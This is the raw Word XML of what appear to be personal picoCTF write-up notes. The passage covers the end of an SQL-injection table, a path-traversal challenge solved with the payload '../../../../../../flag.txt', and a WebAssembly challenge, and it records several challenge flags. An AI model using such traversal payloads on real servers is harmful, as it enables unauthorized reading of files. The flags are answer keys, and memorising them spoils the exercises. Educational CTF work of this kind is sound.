          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>----+-----------+-----------+----------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BF27445"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1 | Luke      | Skywalker | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:highlight w:val="yellow"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:highlight w:val="yellow"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>{L3arN_S0m3_5qL_t0d4Y_73b0678f}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F63610B"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2 | Leia      | Organa    | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Alderaan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="328EC514" w14:textId="77777777" w:rsidR="00DB370A" w:rsidRPr="00DB370A" w:rsidRDefault="00DB370A" w:rsidP="00DB370A">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">  3 | Han       | Solo      | Corellia</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22B97761" w14:textId="2A2B6131" w:rsidR="00773038" w:rsidRDefault="00DB370A" w:rsidP="00DB370A">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>(3 rows)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BA77408" w14:textId="00498DC4" w:rsidR="00773038" w:rsidRDefault="00DB370A" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">lag: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>{L3arN_S0m3_5qL_t0d4Y_73b0678f}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ED2745E" w14:textId="7AC71F00" w:rsidR="00773038" w:rsidRDefault="00773038" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43FD2F92" w14:textId="77777777" w:rsidR="00773038" w:rsidRDefault="00773038" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="681E3BA0" w14:textId="77777777" w:rsidR="00C15385" w:rsidRDefault="00C15385" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A6449E1" w14:textId="5E340C83" w:rsidR="00AC1BAC" w:rsidRDefault="00AC1BAC" w:rsidP="00AC1B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lastRenderedPageBreak/>
        <w:t>Forbidden Paths</w:t>
      </w:r>
      <w:r w:rsidR="003F18E9">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t xml:space="preserve">          path traversal     easy </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4472F53C"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936D6FE" w14:textId="77777777" w:rsidR="00AC1BAC" w:rsidRDefault="00AC1BAC" w:rsidP="00AC1B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17E279BC" w14:textId="77777777" w:rsidR="00AC1BAC" w:rsidRDefault="00AC1BAC" w:rsidP="00AC1B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LT 'SYREAL' JONES</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6664E242" w14:textId="77777777" w:rsidR="00AC1BAC" w:rsidRDefault="00AC1BAC" w:rsidP="00AC1B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4748EA53" w14:textId="7D5C6BE5"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Can you get the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>flag?Here's</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> HYPERLINK "http://saturn.picoctf.net:52683/" \t "_blank" </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="5969F6"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>website</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="5969F6"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>.We</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> know that the website files live in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>usr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>/share/nginx/html/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> and the flag is at </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>/flag.txt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> but the website is filtering absolute file paths. Can you get past the filter to read the flag?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA42C32" w14:textId="3D4CCDE4"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Use relative path, go back to /</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="086FD32C" w14:textId="20E8F21C" w:rsidR="00AC1BAC" w:rsidRDefault="00AC1BAC" w:rsidP="00AC1B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Payload:</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC1BAC">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC1BAC">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>../../../../../../flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A2678FD" w14:textId="239CEAEC" w:rsidR="00AC1BAC" w:rsidRDefault="00AC1BAC" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ADD8E6"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ADD8E6"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ADD8E6"/>
        </w:rPr>
        <w:t>{7h3_p47h_70_5ucc355_e5fe3d4d}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55ED35E7" w14:textId="399EA9B1" w:rsidR="00AC1BAC" w:rsidRDefault="00AC1BAC" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="02A19629" wp14:editId="0C0A67D5">
            <wp:extent cx="3901778" cy="3246401"/>
            <wp:effectExtent l="0" t="0" r="381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50"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3901778" cy="3246401"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="16E0CEE2" w14:textId="0E69DCBB" w:rsidR="00EA3443" w:rsidRDefault="003F18E9" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>08/30/2022</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31541B0F" w14:textId="78112048" w:rsidR="00EA3443" w:rsidRDefault="00EA3443" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="24311CD8" wp14:editId="5208406D">
            <wp:extent cx="6332220" cy="255778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51"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="2557780"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="441054D1" w14:textId="4192B250" w:rsidR="0003115B" w:rsidRDefault="0003115B" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33CF7F7B" w14:textId="7732994C" w:rsidR="0003115B" w:rsidRDefault="0003115B" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>ome assembly required 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="648902FF" w14:textId="77777777" w:rsidR="0003115B" w:rsidRDefault="0003115B" w:rsidP="0003115B">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1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7744E718"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 | 70 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29628A97" w14:textId="77777777" w:rsidR="0003115B" w:rsidRDefault="0003115B" w:rsidP="0003115B">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46B9AE5" w14:textId="77777777" w:rsidR="0003115B" w:rsidRDefault="0003115B" w:rsidP="0003115B">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6F222D70" w14:textId="77777777" w:rsidR="0003115B" w:rsidRDefault="0003115B" w:rsidP="0003115B">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D361142" w14:textId="77777777" w:rsidR="0003115B" w:rsidRDefault="00000000" w:rsidP="0003115B">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId152" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="0003115B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:55336/index.html</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2C822BFE"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&lt;html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18DE757C"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294DD118"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&lt;meta charset="UTF-8"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="295B3E4B"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 xml:space="preserve">&lt;script </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0003115B">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0003115B">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>="G82XCw5CX3.js"&gt;&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C717C0B" w14:textId="77777777" w:rsidR="0003115B" w:rsidRPr="0003115B" w:rsidRDefault="0003115B" w:rsidP="0003115B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0003115B">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>&lt;/head&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18B07FB3"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461FB75D"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&lt;h4&gt;Enter flag:&lt;/h4&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49CA539C"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&lt;input type="text" id="input"/&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71F665EE"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&lt;button onclick="</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0003115B">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>onButtonPress</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0003115B">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>()"&gt;Submit&lt;/button&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14B148A2" w14:textId="77777777" w:rsidR="0003115B" w:rsidRPr="0003115B" w:rsidRDefault="0003115B" w:rsidP="0003115B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0003115B">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:tab/>
        <w:t>&lt;p id="result"&gt;&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="703C3B5A" w14:textId="77777777" w:rsidR="0003115B" w:rsidRPr="0003115B" w:rsidRDefault="0003115B" w:rsidP="0003115B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0003115B">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>&lt;/body&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B2FE567" w14:textId="51BDD6FE" w:rsidR="0003115B" w:rsidRDefault="0003115B" w:rsidP="0003115B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0003115B">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D2711A4" w14:textId="0EDCB578" w:rsidR="0003115B" w:rsidRDefault="0003115B" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="442A7DDB" w14:textId="42519A8C" w:rsidR="0003115B" w:rsidRDefault="0003115B" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4FA2B4F1" wp14:editId="348BEDE7">
            <wp:extent cx="6332220" cy="900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32220" cy="900430"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CA2E4B2" w14:textId="1B8B9D00" w:rsidR="00D93088" w:rsidRDefault="00D93088" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D93088">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>mercury.picoctf.net:55336/JIFxzHyW8W</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12FA3D32" w14:textId="1CDB52CE" w:rsidR="00D93088" w:rsidRDefault="00D93088" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve">get a file </w:t>
      </w:r>
      <w:r w:rsidRPr="00D93088">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>JIFxzHyW8W</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25045C9D" w14:textId="600723A9" w:rsidR="00D93088" w:rsidRDefault="00D93088" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve">cat </w:t>
      </w:r>
      <w:r w:rsidRPr="00D93088">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>JIFxzHyW8W</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C9E5FC5" w14:textId="0898D398" w:rsidR="0003115B" w:rsidRDefault="0003115B" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>{51e513c498950a515b1aab5e941b2615}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69FA2A89" w14:textId="3D3EAC13" w:rsidR="00517A56" w:rsidRDefault="00517A56" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="285C3ABB" w14:textId="7545EC00" w:rsidR="00517A56" w:rsidRDefault="00517A56" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="335FFB8A" w14:textId="77777777" w:rsidR="00517A56" w:rsidRDefault="00517A56" w:rsidP="00517A5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2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0441AD89"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 | 110 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66AB106C" w14:textId="77777777" w:rsidR="00517A56" w:rsidRDefault="00517A56" w:rsidP="00517A5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4BA1ED27" w14:textId="77777777" w:rsidR="00517A56" w:rsidRDefault="00517A56" w:rsidP="00517A5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1E13DCEB" w14:textId="77777777" w:rsidR="00517A56" w:rsidRDefault="00517A56" w:rsidP="00517A5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B0EDE7C" w14:textId="475CEC2F" w:rsidR="00517A56" w:rsidRDefault="00000000" w:rsidP="00517A56">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId154" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="00517A56">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:61778/index.html</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="52DD9D9E" w14:textId="1AF4885F" w:rsidR="00517A56" w:rsidRDefault="00517A56" w:rsidP="00517A56">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
